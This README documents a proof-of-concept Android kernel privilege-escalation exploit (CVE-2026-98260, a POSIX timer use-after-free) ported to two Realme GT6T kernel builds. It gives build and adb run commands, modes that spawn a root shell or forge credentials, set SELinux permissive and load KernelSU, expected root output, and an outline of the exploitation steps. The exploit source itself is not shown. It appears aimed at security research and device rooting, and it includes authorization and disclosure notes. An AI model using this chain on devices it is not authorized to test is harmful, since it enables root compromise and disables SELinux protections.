# GT6T Timer PoC — CVE-2026-98260

A research port of the **CVE-2026-98260** POSIX CPU timer use-after-free
(same bug class as CVE-2026-64560) for the **Realme GT6T**.

The exploit is a local privilege-escalation PoC. It is intended for security
research on hardware you own or are explicitly authorized to test. It is not a
one-tap consumer root tool, and it is not a permanent root solution.

---

## Overview

CVE-2026-98260 is a use-after-free in the POSIX CPU timer code. A per-thread
CPU timer keeps a reference to the PID of the thread it is attached to. When a
non-leader thread calls `execve()` and the exec fails after `de_thread()`, the
kernel can free the `k_itimer` while its timerqueue node is still queued on the
task. Reaping the task later erases the freed node from the rbtree, giving a
controlled write primitive.

The upstream fix is:

> `exec: Cleanup POSIX timers right after de_thread()`

It moves the timer cleanup in `begin_new_exec()` to immediately after
`de_thread()`. At the time of writing, that fix is **not backported to the
6.1.y branch**, and the 6.1.157 GT6T build is still in the pre-fix state:
`posix_cpu_timers_exit()` is still called after `unshare_files()` /
`set_mm_exe_file()`.

This repository contains a port of the public timer LPE to two GT6T kernel
builds. The binary auto-selects the correct profile from `uname -r`.

---

## Affected builds

| Profile | Kernel release | Page size | Status |
|---|---|---|---|
| `gt6t-1200` | `6.1.141-android14-11-o-gf61012bbfa24` | 4K | vulnerable |
| `gt6t-1310` | `6.1.157-android14-11-o-g00d81d97d759` | 4K | vulnerable at time of writing |

Both profiles were verified by disassembly against the corresponding
`vmlinux-to-elf` recovery of the shipped `boot.img` kernel.

If the kernel release does not match either profile, the binary prints the
supported list and exits without touching the kernel.

---

## Repository layout

```
.
├── README.md
├── LICENSE
└── timer/
    └── gt6t_1310.c
```

`gt6t_1310.c` is the complete PoC. It contains both the 1200 and 1310
profiles and selects one at runtime.

---

## Build

The PoC is a single C file with no external dependencies beyond libc and
pthreads. Build it with the Android NDK clang for AArch64:

```bash
$NDK/toolchains/llvm/prebuilt/<host>/bin/clang \
  --target=aarch64-linux-android21 \
  -O2 -Wall -Wno-unused-result -pthread \
  timer/gt6t_1310.c -o gt6t_1310
```

Example on Windows:

```powershell
& "$NDK\toolchains\llvm\prebuilt\windows-x86_64\bin\clang.exe" `
  --target=aarch64-linux-android21 `
  -O2 -Wall -Wno-unused-result -pthread `
  timer\gt6t_1310.c -o gt6t_1310
```

The result is an AArch64 PIE. No root is needed to build it.

---

## Usage

Push the binary and run it as the **shell** user (`uid 2000`,
`u:r:shell:s0`). The exploit needs `/sys/kernel/tracing`, which the shell
domain can access. Do not run it via `adb root`.

```bash
adb push gt6t_1310 /data/local/tmp/gt6t_1310
adb shell chmod 755 /data/local/tmp/gt6t_1310

# Safe probe: detect kernel, print profile, no writes
adb shell /data/local/tmp/gt6t_1310 target

# Full fake-cred + KernelSU late-load chain
adb shell /data/local/tmp/gt6t_1310 fake
```

For the `fake` mode, prefer running it detached so the shell returns:

```bash
adb shell "nohup /data/local/tmp/gt6t_1310 fake \
  > /data/local/tmp/gt6t_fake.log 2>&1 &"
adb shell tail -f /data/local/tmp/gt6t_fake.log
```

The exploit also writes its log to `/data/local/tmp/timer_last.log`.

---

## Modes

| Argument | Behaviour |
|---|---|
| `target` | Detect the kernel, print the selected profile and timer site. No exploit, no writes. |
| `leak` | Leak the child cred pointer, then exit. No writes. |
| `probe` | Run the page-type probe only. |
| `ids` | Discover page types and exit. |
| `shell` | Zero-write cred endgame; the child execs an interactive root shell (`sh -i`). |
| `fake` | Fake-cred endgame: overwrite `task->cred`, set SELinux permissive, run the KernelSU late-load script. Parks forever; reboot to clean. |
| *(no argument)* | Zero-write cred endgame; the child runs `id`, prints its SELinux context, and exits. |

`prepare` is **not** a binary mode. It is the app-side action that deploys the
binary and runs `target`. Typing `./gt6t_1310 prepare` falls through to the
default exploit path.

---

## Expected output

### `target` on 1310

```
[+] device=... kernel=6.1.157-android14-11-o-g00d81d97d759
[+] pagesize=4096 profile=gt6t-1310 timer_site=0xffffffc00842aa24 copy_process=0x4e818
target=gt6t-1310
device=...
kernel=6.1.157-android14-11-o-g00d81d97d759
pagesize=4096
profile=gt6t-1310
timer_site=0xffffffc00842aa24
```

### `target` on 1200

```
target=gt6t-1200
...
timer_site=0xffffffc00843a428
```

### `fake` — key milestones

```
[+] child=... cred=0x... target=0x...
[ksu] panic_on_warn=...
[+] fake cred A=0x... selinux_state=0x...
[+] cred writes landed, waking child
[child] woke uid=0 euid=0 mode=fake
[fake] worker setuid(0)=0 errno=0 resuid=0/0/0
[ksu] start uid=0 selinux=Permissive
[ksu] late-load ...
[ksu] late-load rc=0
KSU_LOADED
[+] child report uid=0 euid=0 setuid(0)=0 errno=0 resuid=0/0/0
[!] fake cred page held; reboot to clean -- parking without reap (zombie held)
```

`KSU_MISSING` means no KernelSU/KSUNext/SukiSU manager or `libksud.so` was
found. `KSU_STALE` means the manager and kernel uapi versions do not match.

---

## How it works (high level)

1. **Trigger** — create a per-thread CPU timer, then make a non-leader thread
   exec a program that fails after `de_thread()`. The `k_itimer` is freed while
   its timerqueue node is still queued.
2. **Leak** — use the kmem trace events to recover the child cred pointer and
   the KASLR slide.
3. **Reclaim** — reclaim the freed `k_itimer` slab page with a controlled
   socket-buffer payload.
4. **Write** — reaping the task erases the stale node from the rbtree. The
   `rb_erase` stores are used as a constrained write primitive.
5. **Endgame** — either zero the child `cred->uid` (zero-write path) or point
   `task->cred` at a forged full-capability cred, set SELinux permissive, and
   run the KernelSU late-load script (fake-cred path).

The write primitive is data-only; it does not call a function pointer, so
`CONFIG_CFI_CLANG` does not block it. `CONFIG_INIT_ON_ALLOC_DEFAULT_ON` and
`CONFIG_SLAB_FREELIST_RANDOM` affect reliability, not the primitive itself.

---

## Safety and cleanup

- A failed run can **panic and reboot** the device. That is the realistic worst
  case; it is not a brick.
- A failed plant leaves a stale timerqueue node. The exploit parks instead of
  reaping it, because reaping an uncontrolled node can panic the kernel.
- **Do not kill the parked process.** Reboot when you are done.
- Reboot is the only clean way to remove parked processes and unload
  KernelSU.
- SELinux is left permissive until the next reboot.
- Back up important data before testing. A panic during a write can lose
  unsaved data.
- Use only on hardware you own or are explicitly authorized to modify.

---

## Responsible disclosure

The 6.1.157 build is still in the pre-fix state at the time of writing. If you
are the device vendor or a carrier, please route this to your security team.
If you are a researcher, consider reporting to the vendor before publishing a
weaponized version.

The upstream fix is:

> `exec: Cleanup POSIX timers right after de_thread()`

Backporting that commit to the 6.1.y branch is the actual mitigation.

---

## Credits

This port would not exist without the following work:

- **[YuKongA](https://github.com/YuKongA/CVE-2026-98260)** — original
  CVE-2026-98260 exploit (MIT), based on work by **woshigenm** and the other
  98260 ports. This is the upstream PoC this port derives from.
- **[kpgc10kai](https://github.com/kpgc10kai)** — Android porting work and the
  TimerRoot project. The Android-side structure, Shizuku execution model, and
  the timer LPE port this repository is based on come from his work.
- **TimerRoot / aurora port** — the timer LPE port and the KernelSU late-load
  chain.
- **[Rikka](https://github.com/RikkaApps/Shizuku)** — Shizuku and Shizuku-API
  (Apache-2.0), which provide the shell-uid execution environment.
- **KernelSU / KernelSU-Next** — the late-load root module path (GPL-2.0).
- The GT6T testers and the wider 98260 port community.

If any credit is missing or misattributed, please open an issue and it will be
corrected.

---

## License

This port is released under the **MIT License**.

The upstream exploit (`YuKongA/CVE-2026-98260`) is MIT-licensed. The TimerRoot
app code is MIT-licensed. Shizuku and Shizuku-API are Apache-2.0. KernelSU is
GPL-2.0. Those components keep their own licenses; nothing here changes them.

The MIT text below applies to this port. Keep the upstream copyright notices
when redistributing.

```
MIT License

Copyright (c) 2026 YuKongA
Copyright (c) 2026 kpgc10kai
Copyright (c) 2026 <your name>

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

> Replace `<your name>` with your name or handle. If the upstream `LICENSE`
> file uses a different copyright line, copy that line verbatim instead of the
> one above.

---

## Disclaimer

This software is provided for security research and education. It is not
affiliated with Realme, OPPO, Google, KernelSU, or Shizuku. The authors take no
responsibility for data loss, bricked devices, voided warranties, or anything
else that happens to hardware you point this at. Use it only on devices you own
or are explicitly authorized to test.
